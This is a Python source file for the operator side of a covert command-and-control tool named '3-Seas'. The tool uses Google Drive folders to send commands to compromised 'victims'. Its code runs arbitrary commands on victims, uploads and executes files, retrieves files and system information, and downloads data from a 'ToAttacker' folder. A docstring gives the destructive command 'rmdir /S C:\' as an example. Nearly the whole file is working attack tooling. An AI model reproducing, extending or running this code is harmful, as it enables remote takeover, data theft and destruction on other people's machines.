# import all config variables
from config import *
import drive_functions as drive

import argparse
import json
import shlex

from notif_server import start_listen, send_kill
from logger import *
from ui import start_ui

service = None


def send_commands(service, commands):
    """
    This function reads the commands and performs all necessary actions in order to ensure they are executed.
    These actions include uploading any specified files and creating command files in each victim's folder.
    Each entry in the parameter 'commands' dictionary is in the following form:
    [
      {
        "command": "get_file",
        "filename": "blah.txt" || "cmd": "rmdir /S C:\"
      },
    ]
    """

    for victim in commands:
        folder_id = drive.get_from_attacker_folder_id(service, victim)
        command_list = commands[victim]
        for command in command_list:
            if command["command"] is "send_file" or command["command"] is "execute_file":
                file_path = command["filename"]
                drive.upload_send_file(service, file_path, os.path.basename(os.path.normpath(file_path)), folder_id)

            if command["command"] is "rename":
                rename_folder_id = drive.get_victim_folder_id_from_name(service, victim)
                drive.rename_file(service, rename_folder_id, command["new_name"])
                logger().info("Rename Victim " + str(folder_id) + " to " + command["new_name"])
                return

            if command["command"] is "download":
                drive.download_victim_files(service, victim)

            drive.upload_file_memory(service, command["command"], data=json.dumps(command), parent_id=folder_id)
            if command["command"] is not "download":
                logger().info("Sent " + command["command"] + " command to " + victim)


def get_victim_list(service):
    """
    This function polls google drive for all victims and returns their names in a list
    maybe with the timestamp of the last time each one polled the drive?
    :return: list of victims
    """
    page_token = None
    victim_list = []
    toAttacker = "ToAttacker"
    fromAttacker = "FromAttacker"
    results = service.files().list(q="mimeType = 'application/vnd.google-apps.folder'",
                                   spaces='drive',
                                   fields='nextPageToken, files(id, name)',
                                   pageToken=page_token).execute()

    for item in results.get('files', []):
        if item['name'] != toAttacker and item['name'] != fromAttacker:
            victim_list.append(item['name'])

    return victim_list


def create_parser(console=False):
    parser = argparse.ArgumentParser(description="3-Seas Covert Command & Control Attacker Application",
                                     add_help=console)

    parser.add_argument("--interactive", "-i", action="store_true", dest="interactive",
                        help="Launch the interactive window. This ignores all other arguments, "
                             "and is required in order to use the 'listen' functionality. It is the "
                             "default behavior if no arguments are provided.")
    parser.add_argument("--listen", "-l", action="store_true",
                        help="Start the listener to enable semi-real-time notifications from victims. "
                             "This flag is ignored if not launching into interactive mode.")
    parser.add_argument("--list_victims", "--list", "--lv", action="store_true", dest="list",
                        help="List all victims by their identifiers.")
    parser.add_argument("--rename_victim", "--rename", action="store", metavar="new_name", dest="rename",
                        help="Rename the first victim specified to the supplied new_name. "
                             "If more than one are specified, they are simply ignored. "
                             "This is recommended, as GUIDs are not convenient.")
    parser.add_argument("--delete", "-d", action="store_true", help="Delete a victim's folder.")
    parser.add_argument("--get_machine_info", "--minfo", action="store_true", dest="minfo",
                        help="Retrieve general system information from the victim(s).")
    parser.add_argument("--get_file", "--gf", action="append", metavar="filename", dest="get_filename",
                        help="Retrieve a file from the victim(s), or list the files in a directory.")
    parser.add_argument("--send_file", "--sf", action="append", metavar="filename", dest="send_filename",
                        help="Send a file with specified path to the victim(s).")
    parser.add_argument("--execute_command", "--exec", action="append", dest="exec", metavar="command",
                        help="Execute a command on the victim(s). Enclose command in double quotes.")
    parser.add_argument("--execute_file", "--execf", action="append", nargs=2, metavar=("filename", "cmd"),
                        dest="exec_filename",
                        help="Send a file to the victim(s) and then run it. Command to Run File and File Name Should Be Surrounded With Quotation Marks.")
    parser.add_argument("--download_files", "--download", action="store_true", dest="download",
                        help="Download and Delete All Files in ToAttacker Folder of a Victim")
    parser.add_argument("--debug", action="store_true", help="Enable debug output.")
    if not console:
        parser.add_argument("--help", action="store_true", help="Show this help message.")
        parser.add_argument("--exit", action="store_true", help="Exit the program.")
    parser.add_argument("victims", action="store", nargs=argparse.REMAINDER, metavar="victim",
                        help="Space-delimited list of victim identifiers. If none are specified, it is assumed that "
                             "you want to send the commands to ALL victims.")
    return parser


# TODO: Add notification check and clear commands
def main():
    global service
    creds = drive.authorize()
    service = drive.build('drive', 'v3', credentials=creds)

    parser = create_parser(console=True)
    args = vars(parser.parse_args())
    init_logger(args["debug"])
    logger().info("3-seas C&C started.")
    # Validate selections
    if args["interactive"]:
        launch_interactive_mode(args["listen"])
    elif args["list"]:
        print("Victims:\n{}".format("\n".join(get_victim_list(service))))
    else:
        commands = parse_arguments(service, args)
        if len(commands) == 0 and not args["delete"]:
            launch_interactive_mode(args["listen"])
        else:
            send_commands(service, commands)
    do_exit(0)


def launch_interactive_mode(listen):
    setup_interactive_logging()
    if listen:
        start_listen(NOTIF_SERVER_URL)
    start_ui(parse_interactive)


def parse_interactive(line):
    global service
    parser = create_parser()
    logger().debug("COMMAND ENTERED: " + line)
    args = shlex.split(line)
    for i in range(len(args)):
        if args[i] in ["listen", "list_victims", "list", "rename_victim", "rename", "get_machine_info", "minfo",
                       "get_file",
                       "send_file", "execute_command", "exec", "execute_file", "execf", "help", "exit", "delete",
                       "download_files", "download"]:
            args[i] = "--" + args[i]
    parsed = vars(parser.parse_args(args))
    if parsed["help"]:
        logger().info(parser.format_help())
    elif parsed["exit"]:
        do_exit(0)
    elif parsed["listen"]:
        server_proc = send_kill()
        if server_proc is not None:
            stop_notif_server()
            server_proc.join()
            logger().info("Notification server stopped.")
        else:
            start_listen(NOTIF_SERVER_URL)
    elif parsed["list"]:
        logger().info("Victims:\n{}".format("\n".join(get_victim_list(service))))
    else:
        commands = parse_arguments(service, parsed, interactive=True)
        send_commands(service, commands)


def parse_arguments(service, args, interactive=False):
    logger().debug("PARSED: " + str(args))
    commands = {}
    if len(args["victims"]) == 0:
        if args["delete"]:
            logger().warning("Did you mean to delete all victims? Try again, but specify \"__force__\" as the only victim.")
        else:
            args["victims"] = get_victim_list(service)
    for victim in args["victims"]:
        commands[victim] = []
        if args["download"]:
            commands[victim].append(
                {
                    "command": "download"
                }
            )
        if args["minfo"]:
            commands[victim].append(
                {
                    "command": "get_machine_info"
                }
            )
        for getfile in args["get_filename"] or []:
            commands[victim].append(
                {
                    "command": "get_file",
                    "filename": getfile
                }
            )
        for sendfile in args["send_filename"] or []:
            commands[victim].append(
                {
                    "command": "send_file",
                    "filename": sendfile
                }
            )
        for cmd in args["exec"] or []:
            commands[victim].append(
                {
                    "command": "execute",
                    "cmd": cmd
                }
            )
        for filename, cmd in args["exec_filename"] or []:
            commands[victim].append(
                {
                    "command": "execute_file",
                    "filename": filename,
                    "cmd": cmd
                }
            )
        if args["rename"] is not None:
            if len(args["victims"]) is not 1:
                logger().error("More than one victim specified for a rename! Aborting...")
                if not interactive:
                    do_exit(1)
                else:
                    return {}
            commands[victim].append(
                {
                    "command": "rename",
                    "new_name": args["rename"]
                }
            )
        if args["delete"]:
            commands[victim] = []
            if len(args["victims"]) == 1 and victim == "__force__":
                for vic in get_victim_list(service):
                    drive.delete_victim(service, vic)
                return {}
            else:
                drive.delete_victim(service, victim)

        if len(commands[victim]) == 0:
            del commands[victim]
    return commands


def do_exit(code=0):
    """
    This will be responsible for cleaning up the webserver and exiting.
    :param code: exit code
    """
    server_proc = send_kill()
    if server_proc is not None:
        stop_notif_server()
        server_proc.join()
    exit(code)


if __name__ == '__main__':
    main()
